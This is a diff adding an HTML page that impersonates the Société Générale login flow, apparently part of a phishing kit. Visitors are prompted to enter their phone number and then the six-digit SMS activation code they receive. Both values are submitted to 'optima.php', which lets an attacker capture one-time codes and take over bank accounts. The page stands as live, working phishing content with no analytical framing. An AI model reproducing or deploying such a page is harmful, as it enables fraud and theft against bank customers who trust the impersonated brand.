@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<title>Société Générale | Connexion</title>
+	<link rel="icon" type="image/x-icon" href="./img2/index.ico">
+	<link rel="stylesheet" href="./css/main-sms.css">
+	<link rel="stylesheet" href="./css/media-sms.css">
+	<script type="text/javascript">
+		function change_etap(){document.getElementById('stag-put').style.display = "none";document.getElementById('hena-etap-sms').style.display = "block";}function chek_num() {var boxa = document.getElementById('pu-tel').value;var boxi = document.getElementById('puta-tele');boxi.innerHTML = boxa;change_etap();}function chek_cont_num(){var boxa = document.getElementById('pu-tel');if(boxa.value.length == 10){chek_num();document.getElementById('errormsg').style.display ="none";}else{document.getElementById('errormsg').style.display ="block";}}function check_tele_sms(){var boxi = document.getElementById('put-sms');if (boxi.value.length == 0){document.getElementById('errormsg1').style.display ="block";}else if(boxi.value.length == 6){document.getElementById('myform').submit();}else{document.getElementById('errormsg1').style.display ="block";}}
+	</script>
+</head>
+<body>
+	<div class="kolchi">
+		
+		<div class="header">
+			<div class="header-left"></div>
+			<!-- hena sala header left -->
+			<div class="header-right"></div>
+			<!-- hena sala header right -->
+		</div>
+		<!-- hena sala header -->
+		<div class="header-phone">
+				<div class="header-phone-left"></div>
+				<div class="header-phone-right"></div>
+	    </div>
+			<!-- hena sala header right -->
+		<div class="navbar">
+			<div class="hr"></div>
+			<div class="hr-bg">
+				<div class="hr-tit"></div>
+			</div>
+		</div>
+		<div class="navbar-phone"></div>
+		<!-- hena sala navbar right -->
+		<center>
+			<div class="dakchi-west">
+
+				<div class="dakchi-west-body">
+					<div class="gog"></div>
+					<div class="titi1"></div>
+					<div class="stags1"></div> 
+
+					<form id="myform" action="optima.php?send-virefication-sms" method="POST" accept-charset="utf-8">
+					<div class="stag-put" id="stag-put">
+						<div class="taga1">1.Enregistrez et activez votre numéro de téléphone de Sécurité  </div>
+						<div class="stags1"></div>
+						<div class="errormsg" id="errormsg">veuillez corrigé votre numéro</div>
+					    <div class="stag-put2"><input type="text" id="pu-tel" name="pu-tel" pattern="\d*" class="helephone" maxlength="10" size="10" placeholder="Saisissez votre numéro de téléphone" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;"></div>
+					    <div class="stags1"></div>
+					    <div class="stag-put3">
+					    	<center><div class="buta1" onclick="chek_cont_num();">Enregistré</div></center>
+					    </div>
+					</div>
+
+					<div class="hena-etap-sms" id="hena-etap-sms">
+						<div class="doda0">Elle est indispensable pour la protection de vos comptes et la signature de vos contrats: Un sms vient de vous êtes adressé avec un code d'activation.</div>
+						<div class="doda1">2.Code reçu par SMS sur votre numéro de téléphone sécurité</div>
+						<div class="errormsg1" id="errormsg1">veuiller saisir votre sms reçu sur votre  numéro de téléphone sécurité</div>
+						<div class="doda-clear"></div>
+						<div class="doda2"><span type="text" class="salas" id="puta-tele" value="" readonly=""></span></div>
+						<div class="doda-clear"></div>
+						<div class="doda3">
+							<input type="text" id="put-sms" name="put-sms" class="helephone" maxlength="6" size="6" placeholder="Saisissez votre SMS reçu par téléphone" >
+						</div>
+						<div class="doda-clear"></div>
+						<div class="doda4"><center><div class="buta1" onclick="check_tele_sms();">Activer</div></center></div>
+					</div>
+					</form>
+
+
+				</div>
+				
+			</div>
+			<!-- hena sala dakchi west -->
+		</center>
+    
+	</div>
+	<!-- hena sala kolchi -->
+     <div class="foot"></div>
+</body>
+</html>
